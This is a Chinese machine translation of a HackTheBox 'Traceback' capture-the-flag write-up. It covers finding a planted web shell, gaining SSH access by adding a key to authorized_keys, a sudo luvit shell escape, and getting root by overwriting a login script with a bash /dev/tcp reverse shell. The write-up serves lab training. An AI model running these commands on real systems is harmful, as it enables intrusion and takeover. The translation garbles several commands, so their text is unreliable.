<html>
<head>
<title>HacktheBox Traceback Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子回溯记录</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-traceback-write-up-9970293acc25?source=collection_archive---------4-----------------------#2020-08-15">https://infosecwriteups.com/hackthebox-traceback-write-up-9970293acc25?source=collection_archive---------4-----------------------#2020-08-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/5917adfb09e8a701e2b03c36eea17e8d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/1*Cu3TjHtS8zlwPHwJ4_5ZAg.png"/></div></figure><p id="fa82" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi ks translated">我们会利用HTB的回溯技术。盒子太简单了，太直截了当了。如果你是初学者，我会推荐你用这个盒子。让我们开始开发它的旅程。</p><h1 id="5933" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">列举</h1><p id="b8ff" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">从<a class="ae me" href="https://github.com/21y4d/nmapAutomator" rel="noopener ugc nofollow" target="_blank">nma自动扫描</a>开始</p><blockquote class="mf"><p id="bca9" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">cmd =。/nma自动马达10.10.10.181全部</p></blockquote><blockquote class="mp mq mr"><p id="3902" class="ju jv ms jw b jx mt jz ka kb mu kd ke mv mw kh ki mx my kl km mz na kp kq kr ij bi translated">traceback.htb的Nmap扫描报告(10.10.10.181) <br/>主机已启动(0.16秒延迟)。</p><p id="0190" class="ju jv ms jw b jx jy jz ka kb kc kd ke mv kg kh ki mx kk kl km mz ko kp kq kr ij bi translated">端口状态服务版本<br/> 22/tcp开放ssh OpenSSH 7.6p 1 Ubuntu 4 Ubuntu 0.3(Ubuntu Linux；协议2.0)<br/>| ssh-hostkey:<br/>| 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:E5:6d:8a:28(RSA)<br/>| 256 54:BD:46:71:14:BD:B2:42:a1:B6:B0:2d:94:14:3b:0d(ECD sa)<br/>|CPE: cpe:/o:linux:linux_kernel</p></blockquote><p id="fc98" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在继续之前，让我们分析一下端口扫描。机器上运行着两个端口，分别是22和80。我们需要一些凭证来登录运行ssh服务的端口22和运行http服务的端口80。现在让我们开始枚举端口80。</p><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nb"><img src="../Images/24bdd77769b3af95af608fdc1e7e41f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N8lPbTx6dALen48t6Uo1JA.png"/></div></div></figure><p id="cc1a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这将是机器的主页。通过阅读网站上的文字，我们可以知道网站上还有任何后门。也看看源代码吧。</p><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/4a288862f83b1eeabd3245db16e8c30d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1210/format:webp/1*jixW_tMyqApWvY7YdPQNsA.png"/></div></figure><p id="dc8d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，很明显，后门是关于机器上的web外壳的。让我们来寻找“最佳网络外壳”。</p><p id="f327" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">经过一番侦查，我们得到了一个GitHub回购，它拥有最好的web shells，即“<a class="ae me" href="https://github.com/TheBinitGhimire/Web-Shells" rel="noopener ugc nofollow" target="_blank">https://github.com/TheBinitGhimire/Web-Shells</a>”。下载回购文件，列出所有网络外壳名称，运行dirb扫描仪检查后门文件的位置。</p><blockquote class="mp mq mr"><p id="1b29" class="ju jv ms jw b jx jy jz ka kb kc kd ke mv kg kh ki mx kk kl km mz ko kp kq kr ij bi translated">cmd = dirb<a class="ae me" href="http://traceback.htb" rel="noopener ugc nofollow" target="_blank">http://traceback . htb</a>~/HTB/traceback/we B- shell/shell . txt</p></blockquote><p id="cec7" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">几分钟后，我们观察到有一个后门“smevk.php”在网站上运行。</p><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nl"><img src="../Images/7a4959b5d635efae4ff3c1087892fcd3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yf36EDBpZq1EoXdebxsjlA.png"/></div></div></figure><p id="107d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如前所述，框是直截了当的，我们可以很容易地在smevk.php的默认凭证登录</p><blockquote class="mf"><p id="aec4" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">用户名:- admin</p><p id="537b" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">密码:- admin</p></blockquote><figure class="nn no np nq nr jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nm"><img src="../Images/3ba0db2041b0641db84ce7905e587bd1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y0h5OTCZbrfYBJ-wptAkaw.png"/></div></div></figure><p id="a9c3" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">登录后，我们会被引导到这里</p><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nb"><img src="../Images/f7841073b0f582546d68e38beb3611a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9t-HOoHGCwRznOLH94F_Dg.png"/></div></div></figure><p id="9616" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以看到，我们有多种功能，例如</p><blockquote class="mf"><p id="6507" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">1.上传文件。</p><p id="c6f5" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">2.建立档案。</p><p id="4e78" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">3.阅读文件。</p><p id="b1c0" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">4.执行任何命令。</p><p id="db18" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">5.制作一个目录。</p></blockquote><p id="dba3" class="pw-post-body-paragraph ju jv iq jw b jx mt jz ka kb mu kd ke kf mw kh ki kj my kl km kn na kp kq kr ij bi translated">现在让我们从上传netcat的execute any command功能开始，这样我们可以得到一个反向shell。</p><h1 id="0519" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">剥削</h1><p id="0ccb" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">正如我们可以看到的，我们有一个执行命令的选项，那么让我们通过将我们的ssh公钥添加到当前用户~/来尝试使用正确的ssh会话而不是web shell。ssh/授权密钥。</p><p id="f22a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">如果你不熟悉如何做到这一点，然后访问<a class="ae me" href="https://docs.oracle.com/cd/E19683-01/806-4078/6jd6cjru7/index.html" rel="noopener ugc nofollow" target="_blank">这里</a>。</p><p id="4a7b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，在生成公共ssh密钥之后，复制“id_rsa.pub”并在web页面上执行以下命令。</p><blockquote class="mf"><p id="9286" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">cmd = echo " your _ id _ RSA . pub " &gt; &gt;/home/web admin/。ssh/authorized _ key。</p></blockquote><p id="165b" class="pw-post-body-paragraph ju jv iq jw b jx mt jz ka kb mu kd ke kf mw kh ki kj my kl km kn na kp kq kr ij bi translated">执行该命令后，我们可以使用ssh连接进行连接。</p><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi ns"><img src="../Images/9c020ae80780a8847d27a16ed299dc55.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Lss2YtFaubfU-ettCb08rg.png"/></div></div></figure><p id="e082" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，让我们寻找对root用户的权限提升。</p><h1 id="d6fb" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">后期开发</h1><p id="06bc" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">当我们在webadmin中查看时，我们得到一个note.txt文件，并检查sudo权限。</p><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/95cdf35c47c2883f4156b5f33c6676c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:892/format:webp/1*UnqX0TaIzVdXoo4o7IhwnQ.png"/></div></figure><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nu"><img src="../Images/3fc796d99cf4faa0b72a867585038401.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0dyp8Ox5tpU8_498d2vA_g.png"/></div></div></figure><p id="26b2" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">正如我们看到的，我们可以通过luvit访问链接“【https://gtfobins.github.io/gtfobins/lua/】T2”来枚举sysadmin。正如我们看到的，我们可以通过sudo权限来枚举</p><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nv"><img src="../Images/e5130acf43e01312de535a2b44733ee9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*endU6v5wrWKgzMXUT7wHQg.png"/></div></div></figure><p id="5efd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">执行下面的命令，我们可以枚举为sysadmin。</p><blockquote class="mf"><p id="43e4" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">cmd = sudo-u sysadmin/home/sysadmin/luvit-e ' OS . execute("/bin/bash ")'</p></blockquote><figure class="nn no np nq nr jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi nw"><img src="../Images/a48308acb956ff543b627b2359502baf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DnnTD-nxG-M1XSLnHI8Gew.png"/></div></div></figure><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/99a4728a43b41809bb7b87d9fed08751.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/format:webp/1*BPXnIbS8cJsWdQYBhMWduw.png"/></div></figure><p id="abdd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在，让我们看看如何枚举root并获取root.txt。因此，我们将在计算机上运行LinPriv.sh文件并查看结果。</p><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi ny"><img src="../Images/7d62813e402b23856d783759855d3bbd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gd0VMDbkjs3POkf0cGK87A.png"/></div></div></figure><p id="2386" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在浏览结果时，我们观察到当从ssh登录时，有一个脚本“00-header”作为root运行。</p><p id="db65" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">答对了，现在我们有两个选择</p><ol class=""><li id="bfa6" class="nz oa iq jw b jx jy kb kc kf ob kj oc kn od kr oe of og oh bi translated">我们可以把一个反壳作为根。</li><li id="e1e1" class="nz oa iq jw b jx oi kb oj kf ok kj ol kn om kr oe of og oh bi translated">我们可以得到root.txt。</li></ol><p id="5e29" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">让我们以反壳为根。</p><p id="f587" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我在脚本的顶部添加了nc reverse shell，这样rev shell代码可以首先执行。</p><blockquote class="mf"><p id="f7d3" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">cmd = echo -e '#！/bin/bash \ nbash-I &gt; &amp;/dev/TCP/IP/5555 0 &gt; &amp; 1 ' &gt; 00-header</p></blockquote><p id="224a" class="pw-post-body-paragraph ju jv iq jw b jx mt jz ka kb mu kd ke kf mw kh ki kj my kl km kn na kp kq kr ij bi translated">现在执行命令，然后在另一个选项卡中用ssh再次连接，我们在那里得到一个反向连接。</p><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi on"><img src="../Images/fbda7316038035cc28da048fa0868997.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hV2uKNE2C_ep5jyyJRvEEw.png"/></div></div></figure><p id="327d" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">答对了，我们已经成功地把箱子扎根了。</p><blockquote class="mf"><p id="9a03" class="mg mh iq bd mi mj mk ml mm mn mo kr dk translated">感谢阅读。</p></blockquote><figure class="nn no np nq nr jr gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/69bbd45abad0b6e8c0a585210797722f.png" data-original-src="https://miro.medium.com/v2/resize:fit:532/format:webp/1*xfgmnA7SDu_1emGCuWQqsg.jpeg"/></div><figcaption class="op oq gj gh gi or os bd b be z dk translated"><a class="ae me" href="http://buymeacoff.ee/Viston" rel="noopener ugc nofollow" target="_blank">点击这里</a></figcaption></figure><figure class="nc nd ne nf gt jr gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/bb16dd41285ad610df2224c08caa4834.png" data-original-src="https://miro.medium.com/v2/resize:fit:440/format:webp/1*05Th-NUo8revNZyHI-_Tvw.png"/></div><figcaption class="op oq gj gh gi or os bd b be z dk translated"><a class="ae me" href="https://www.hackthebox.eu/profile/196419" rel="noopener ugc nofollow" target="_blank">点击这里</a></figcaption></figure></div><div class="ab cl ou ov hu ow" role="separator"><span class="ox bw bk oy oz pa"/><span class="ox bw bk oy oz pa"/><span class="ox bw bk oy oz"/></div><div class="ij ik il im in"><div class="nc nd ne nf gt pb"><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation" rel="noopener  ugc nofollow" target="_blank"><div class="pc ab fo"><div class="pd ab pe cl cj pf"><h2 class="bd ir gy z fp pg fr fs ph fu fw ip bi translated">Linux权限提升</h2><div class="pi l"><h3 class="bd b gy z fp pg fr fs ph fu fw dk translated">定时器是systemd单元文件，其名称以。控制的计时器。服务文件或事件。可以用作…</h3></div><div class="pj l"><p class="bd b dl z fp pg fr fs ph fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="pk l"><div class="pl l pm pn po pk pp js pb"/></div></div></a></div><div class="pq pr gp gr ps pb"><a href="https://gtfobins.github.io/gtfobins/lua/" rel="noopener  ugc nofollow" target="_blank"><div class="pc ab fo"><div class="pd ab pe cl cj pf"><h2 class="bd ir gy z fp pg fr fs ph fu fw ip bi translated">lua | GTFOBins</h2><div class="pi l"><h3 class="bd b gy z fp pg fr fs ph fu fw dk translated">它可以通过生成交互式系统外壳来突破受限环境。它可以发回一个…</h3></div><div class="pj l"><p class="bd b dl z fp pg fr fs ph fu fw dk translated">gtfobins.github.io</p></div></div></div></a></div><div class="pq pr gp gr ps pb"><a href="https://github.com/rebootuser/LinEnum" rel="noopener  ugc nofollow" target="_blank"><div class="pc ab fo"><div class="pd ab pe cl cj pf"><h2 class="bd ir gy z fp pg fr fs ph fu fw ip bi translated">rebootuser/LinEnum</h2><div class="pi l"><h3 class="bd b gy z fp pg fr fs ph fu fw dk translated">欲了解更多信息，请访问www.rebootuser.com注意:出口功能目前处于试验阶段…</h3></div><div class="pj l"><p class="bd b dl z fp pg fr fs ph fu fw dk translated">github.com</p></div></div><div class="pk l"><div class="pt l pm pn po pk pp js pb"/></div></div></a></div><div class="pq pr gp gr ps pb"><a href="https://docs.joyent.com/public-cloud/getting-started/ssh-keys/generating-an-ssh-key-manually/manually-generating-your-ssh-key-in-windows" rel="noopener  ugc nofollow" target="_blank"><div class="pc ab fo"><div class="pd ab pe cl cj pf"><h2 class="bd ir gy z fp pg fr fs ph fu fw ip bi translated">在Windows中手动生成SSH密钥</h2><div class="pi l"><h3 class="bd b gy z fp pg fr fs ph fu fw dk translated">在Windows上，可以用多种方式创建SSH密钥。这个文档解释了如何使用两个SSH应用程序，PuTTY和Git…</h3></div><div class="pj l"><p class="bd b dl z fp pg fr fs ph fu fw dk translated">docs.joyent.com</p></div></div><div class="pk l"><div class="pu l pm pn po pk pp js pb"/></div></div></a></div><div class="pq pr gp gr ps pb"><a href="https://www.ssh.com/ssh/keygen/" rel="noopener  ugc nofollow" target="_blank"><div class="pc ab fo"><div class="pd ab pe cl cj pf"><h2 class="bd ir gy z fp pg fr fs ph fu fw ip bi translated">如何使用ssh-keygen生成新的ssh密钥</h2><div class="pi l"><h3 class="bd b gy z fp pg fr fs ph fu fw dk translated">这个页面是关于ssh-keygen的版本。请参见。如果您希望为生成密钥，请参见Windows上的PuTTYgen或…</h3></div><div class="pj l"><p class="bd b dl z fp pg fr fs ph fu fw dk translated">www.ssh.com</p></div></div><div class="pk l"><div class="pv l pm pn po pk pp js pb"/></div></div></a></div></div></div>    
</body>
</html>